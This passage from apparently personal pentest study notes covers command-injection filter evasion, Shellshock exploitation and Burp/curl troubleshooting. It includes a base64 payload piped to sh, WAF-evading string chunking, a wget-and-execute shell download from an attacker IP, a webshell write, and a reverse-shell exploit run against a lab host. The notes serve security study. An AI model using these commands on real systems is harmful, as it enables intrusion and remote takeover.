time</span>! If <strong>which</strong> isn&#39;t blocked, it can test for both things at once.</p><p></p><p><h3>Reverse Shell SW</h3></p><p><strong>python python2 python3</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>perl</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>php</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>nc</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>sh</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>bash</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>zsh</strong></p><p></p><p><h3>File Upload SW</h3></p><p><strong>wget</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>curl</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>nc</strong></p><p></p><p><strong>scp</strong></p><p></p><p><h2>Encoding</h2></p><p>There are many variations for this technique, but I&#39;ll use base64 for this example &amp; assume the target is Linux.</p><p></p><p><strong>{Atker}</strong> <em>echo -n ‘PAYLOAD’ | base64</em></p><p></p><p><strong>{Target}</strong> <em>echo -n ‘B64’ | base64 -d | sh</em></p><p></p><p><h2>Chunking</h2></p><p>Use multiple cmds to break up forbidden strings. Sometimes, each RCE attempt happens in its own session (i.e a new shell is spawned) so changes (e.g setting a var) don&#39;t persist; in these cases, <span style="color:#ff0000;">need to use a 1-liner</span>.</p><p></p><p>In the following example, the WAF never sees the full string but the target OS sees<strong> bash -c id</strong>.</p><p></p><p><em>a=&quot;ba&quot;; c=&quot;sh&quot;; c=$a$b; $c -c id</em></p><p></p><p><h2>File Creation</h2><h2></h2></p><p><h2></h2>Can get around filters by creating a file with your payload &amp; executing it.</p><p></p><p>There are<span style="color:#ff0000;"> 2 options</span>: A) <strong>CLi</strong>: Give file execute permissions &amp; <span style="color:#ff0000;">run it directly</span>. B) <strong>Webshell</strong>: Create Webshell in WebApp&#39;s path &amp; <span style="color:#ff0000;">access it via browser or curl</span>.</p><p></p><p><h3>File Upload</h3></p><p>Upload file to an accessible directory (e.g <strong>/tmp</strong> or<strong> /dev/shm</strong>), give it execute permissions, &amp; run it. Can use <strong>wget</strong>, <strong>curl</strong>, <strong>nc</strong> (with redirection), <strong>scp</strong> (connecting to Attacker&#39;s server) etc.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Omitting Protocol</span>: In rare instances, the first section of the Attacker&#39;s URL must be omitted (<strong>http://</strong>). In this case, the HTTP server MUST be run on port 80 &amp; the port section of the URL must also be omitted (<strong>:PORT</strong>). This is auto filled by <strong>wget</strong> &amp; <strong>curl</strong>.</p><p></p><p><em>wget IP/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh</em></p><p></p><p><h3>File Write</h3></p><p>If you&#39;re unable to upload a file, may still be able to write to a file (e.g using <strong>echo</strong>). For example, you can combine this with encoding-</p><p></p><p><em>echo -n ‘B64’ | base64 -d &gt; /var/www/html/webshell.php</em></p><p></p><p><h1>Dynamic Content</h1></p><p>If a Web App has dynamic content that perioidically changes when a page is loaded, it could be changing based on the value of a Cookie that the server sets.</p><p></p><p>After a Cookie expires, the server will set a new cookie, thus changing the value of the dynamically loaded content. This could be a vulnerable <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#sinks">sink</a>.</p><p></p><p><h2>Example Attack Vectors</h2><ol><li><a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#IDOR">IDOR</a></li></ol></p><p><ol><li>XXE: The changing value could be related to an XML parameter. If you see an oppertunity for XXE, use context clues to determine the variable&#39;s name &amp; see if you can use it to retrieve data as this dynamic value.</li></ol></p><p><ol><li>SQLi: The dynamic value may be a column in a DB&#39;s table, so you may be able to use it to return sensitive info via a UNION attack.</li></ol></p><p></p><p><h1>Shellshock (Linux Server)</h1></p><p><strong>CVE-2014-6271</strong> (Classic Exploit), <strong>CVE-2014-7169</strong>, <strong>CVE-2014-7186</strong>, <strong>CVE-2014-7187</strong>, <strong>CVE-2014-6277</strong> &amp; <strong>CVE 2014-6278</strong></p><p></p><p><a href="https://pentesterlab.com/exercises/cve-2014-6271">Shellshock</a> impacts the Bourne Again Shell &quot;Bash&quot;. Bash is not usually available through a web application but can be indirectly exposed through a Common Gateway Interface &quot;<a href="Infrastructure_36.html#CGI">CGI</a>&quot;.</p><p></p><p><h2>Requirements</h2></p><p>Shellshock generally effects Bash <strong>1.14</strong> - <strong>4.3</strong> (but some versions of 4.3 may still be vulnerable).</p><p></p><p>To exploit Shellshock, you need a way to &quot;talk&quot; to Bash. This implies finding a CGI that will use Bash. CGIs commonly use Python or Perl but it&#39;s not uncommon to find (on old servers), CGI written in Shell or even C.</p><p></p><p><h3>Detection</h3></p><p>If you see<strong> cgi-bin/ </strong>or <strong>.cgi</strong> files, test for Shellshock. Nikto can automatically detect it</p><p></p><p><em>nikto -nossl -host http://0day.thm</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Can be automatically detected AND exploited with <strong>commix</strong> or <strong>MsF</strong> (but these can&#39;t be used freely on the OSCP!).</p><p></p><p><h2>Exploitation</h2></p><p>Using <a href="https://www.exploit-db.com/exploits/34900">Exploit-DB PoC</a>. Can specify path to vulnerable endpoint via <strong>pages</strong> arg, otherwise it&#39;ll try to guess common endpoints. the shell kinda sucks, so I used it to spawn my own Reverse Shell.</p><p></p><p><em>python2 34900.py rhost=0day.thm rport=80 lhost=10.2.11.116 lport=9999 payload=reverse</em> <em>pages=/cgi-bin/test.cgi</em></p><p></p><p><h1>★</h1><h1>Tips</h1><h1>★</h1><ul><li>Nmap may miss things in <strong>robots.txt</strong>, so manually review that page if you find it!</li></ul></p><p><ul><li>May be externally inaccessible WebApps you can find Post Exploit (e.g via<strong> ss -ano</strong> {Linux} or <strong>netstat -anob</strong> {Windows}).</li></ul></p><p><ul><li>Try reading source code for that <a href="Recon_+_Services--WebApp_12.html">WebApp</a>, but if you lack perms (or want GUI), create a <a href="Pivoting_22.html#PF">PF</a> to access it via your Web Browser.</li></ul></p><p><ul><li>The <strong><span style="color:#ff0000;">$secret</span></strong><span style="color:#ff0000;"> variable</span> used by Web Apps <span style="color:#ff0000;">may actually be a user&#39;s creds</span>! (It&#39;s supposed to be a random string, but try it anyways!)</li></ul></p><p><ul><li>Sometimes a site will tell you that a dir doesn&#39;t exist, even when you can nav to a file in that subdir (e.g <strong>/scripts/</strong> is 404 but <strong>/scripts/file.js </strong>appears)</li></ul></p><p><ul><li><em><span style="color:#ff0000;">nikto</span></em><span style="color:#ff0000;"> may reveal</span> subdir&#39;s or other <span style="color:#ff0000;">useful info</span> (but the vuln assessment is rarely accurate). For ex, it <span style="color:#ff0000;">found creds in an HTTP Resp header</span>!</li></ul></p><p><ul><li>If redir away from subdirs, may still be able to send traffic to target endpoint using burp!</li></ul></p><p><ul><li>Sometimes <span style="color:#ff0000;">same/similar WebApp runs on diff ports</span> (e.g 80 &amp; 443 for HTTPS). Sometimes they&#39;re <span style="color:#ff0000;">almost identical but have a diff subdir</span> or w/ <span style="color:#ff0000;">diff perms </span>on accessing a subdir!  <span style="color:#ff0000;">Check each Web App port</span>!</li></ul></p><p><ul><li><span style="color:#ff0000;">Use proper</span> format / <span style="color:#ff0000;">syntax for form fields you aren&#39;t testing</span>! (e.g for email- example@google.com)</li></ul></p><p><ul><li>Some servers use a blank pg for <strong>404</strong>, but a <span style="color:#ff0000;">blank pg could also be </span><strong><span style="color:#ff0000;">200</span></strong> (&amp; a <span style="color:#ff0000;">target for Subdir Enum</span>). Verify Status Codes with DevTools or Burp</li></ul></p><p><ul><li>Check the programming <span style="color:#ff0000;">lanuage version</span> used. For example, CVE-2024-4577 (Unauthenticated RCE for PHP in a Windows Server, versions 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8)</li></ul></p><p><ul><li>Home dir for <strong>www-data</strong> is often Web Root. so you can discover Web Root by fetching <strong>/etc/passwd</strong>. You also may be able to setup SSH keys here (depending on config).</li></ul></p><p></p><p></p><p></p><p><h1>WebApp Troubleshooting</h1></p><p><h2>HTTPS</h2><h2></h2></p><p><h2></h2><h3>Firefox-</h3><h3> </h3><strong><h3>Error code: SSL_ERROR_RX_RECORD_TOO_LONG</h3></strong></p><p>Multiple diff <a href="https://kinsta.com/knowledgebase/ssl_error_rx_record_too_long/">methods</a> of resolving.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Add Exception</span>: Normally, you&#39;d be able to open Settings → <strong>Certificates</strong> → <strong>View</strong> <strong>Certificates</strong> →<strong> Servers</strong> → <strong>Add Exception</strong></p><p></p><p>However, this may not work if this is an internal site is being accessed through a proxy (since Firfox won&#39;t be able to find the site via the settings menu).</p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Can you manually fetch the cert (e.g with nmap) &amp; add it that way?</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Change TLS Preference</span>: This <a href="https://kinsta.com/knowledgebase/ssl_error_rx_record_too_long/#6-change-your-tls-preferences">method</a> makes changes that can affect every site you access going forward, so the changes should be reverted when you&#39;re done. </p><p>Must <a href="https://www.howtogeek.com/779313/how-to-restart-mozilla-firefox/">Restart the Browser</a> to apply the changes.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">OCSP Stapling</span>: <a href="https://stackoverflow.com/questions/20088/is-there-a-way-to-make-firefox-ignore-invalid-ssl-certificates">Disabling</a> allows you to view sites with invalid certs.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Burpsuite</span>: If you <span style="color:#ff0000;">connect using burp&#39;s proxy &amp; its cert, you may bypass these errors</span> by configuring an <a href="Recon_+_Services--WebApp_12.html#burp upstream proxy">Upstream Proxy</a>.</p><p></p><p><h3>curl- </h3><strong><h3>failed to verify the legitimacy of the server</h3></strong></p><p>Instead of verifying the legitimacy of the server (i.e the TLS/SSL Certs), can tell curl to skip the verification step and proceed without checking by using <strong>-k</strong>.</p><p></p><p><a name="burp upstream proxy"></a><h3>Using Burpsuit Upstream Proxy</h3></p><p>(For an HTTP Proxy, a SOCKS Proxy may differ)</p><p></p><p>By relying on Burp&#39;s imported TLS/SSL Cert, you may be able to bypass certain TLS/SSL error in the target App.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Authentication</span>: Able to add creds for various Auth mechanisms under <strong>Upstream Proxy Servers</strong>, but may also need to config <strong>Platform Authentication</strong> (unless I was just doing something wrong).</p><p></p><p>I assumed that <strong>Platform Authentication</strong> was for Authenticating against the target <a href="Recon_+_Services--WebApp_12.html">WebApp</a> itself, &amp; not the Proxy server, but I was having issues until I checked <strong>Do Platform Auth</strong> &amp; <strong>Prompt for Creds on Auth Failure</strong>.</p><p></p><p>(I also added the Dest host&#39;s IP but used the creds for the Proxy Server, a diff host. This may&#39;ve been unnecessary. Disable this?). </p><p></p><p><h2>Burpsuite- HTTP Protocol Version Error</h2></p><p><strong>RST_STREAM received with error code: 0xd (Use HTTP/1.1 for the request)</strong></p><p></p><p>When using Burp&#39;s Proxy (i.e. Using FoxyProxy to route traffic through Burp), I got this error when trying to visit a Web App because <span style="color:#ff0000;">Burp was automatically changing the Request</span> to <strong>HTTP/2 </strong>&amp; the <span style="color:#ff0000;">site only supported </span><strong><span style="color:#ff0000;">HTTP/1.1</span></strong>.<span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;"></span></p><p>Even if a modern site uses HTTP/1.1, it often will also support HTTP/2 (it seems more common to find sites that only support HTTP/2). This issue could indicate a site uses some outdated software.</p><p></p><p><h3>Burp&#39;s Behavior</h3></p><p>“Burp will initially send an HTTP/1.1 request and if an &#39;HTTP/2 200 OK&#39; is received, all subsequent requests will use HTTP/2” -Portswigger</p><p></p><p>In this case, visiting the site prompted for HTTP Basic Auth. Upon successful sign-in, this error appeared (likely bc it triggered a redirect elsewhere).</p><p></p><p>I guess this means that the site sent an HTTP/2 Response for some Request (i.e. when initially visiting the site), but it could only use HTTP/1.1 for certain actions after that.</p><p></p><p><h3>Solutions</h3></p><p><span style="color:#8ff0a4;text-decoration:underline;">Disable Burp</span>: Turn off FoxyProxy or remove the offending site from Burp&#39;s scope.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Turn off HTTP/2 Default</span>: This <span style="color:#ff0000;">may break the site</span> (or at least certain parts of it)! In this case the site was HTTPS, &amp; changing this setting prevented my from connecting at all (Secure Connection Failed). May break some HTTP sites also.</p><p></p><p><strong>Proxy</strong> → <strong>Proxy Settings</strong> → <strong>Network</strong> ↓ <strong>HTTP</strong> ↓ <strong>HTTP/2</strong> ↓ (uncheck) <strong>Default to HTTP/2 if the server supports it</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Match / Repace</span>: Worked in the &quot;Test&quot; but it wasn&#39;t be applied to the actual traffic? Bug in Burpsuite version?</p><p></p><p><strong>Proxy</strong> → <strong>Match and Replace</strong> ↓ <strong>Add</strong> → Edit as follows then click <strong>Test</strong>:</p><p></p><p><strong>Type</strong>: Request Header</p><p><strong>Match</strong>: HTTP/2 (uncheck <strong>Regex Match</strong>)</p><p><strong>Replace</strong>: HTTP/1.1</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Manual Requests</span>: If it&#39;s only for a limited number of Requests, you can use <strong>Intercept, Repeater</strong>, or <strong>Intruder</strong> to manually change the Request to use HTTP/1.1</p><p></p><p><h2>curl- General Use</h2></p><p><h3>POST Requests</h3></p><p>There&#39;s a diff between <strong>--form</strong> &amp; <strong>--data</strong>!</p><p></p><p><h3>Viewing Response Headers</h3></p><p>Response Headers can give more information as to what&#39;s working &amp; what went wrong. Can also be useful for getting cookies upon a successful login.</p><p>To “dump” headers &amp; redirect them to STDOUT, use<strong> -D -</strong></p><p></p><p><h1>Terminology</h1></p><p><h2>Web Root vs Root URL</h2></p><p>The Web Root is the directory that the Web App is being hosted out of (e.g. <strong>/var/www/html/ </strong>).</p><p></p><p>The Root URL is the base URL that the site is using (e.g. <strong>http://site.com/</strong> ).</p><p></p><p>These terms are often used incorrectly (including by me throughout these notes).</p></div>
</body>
</html>
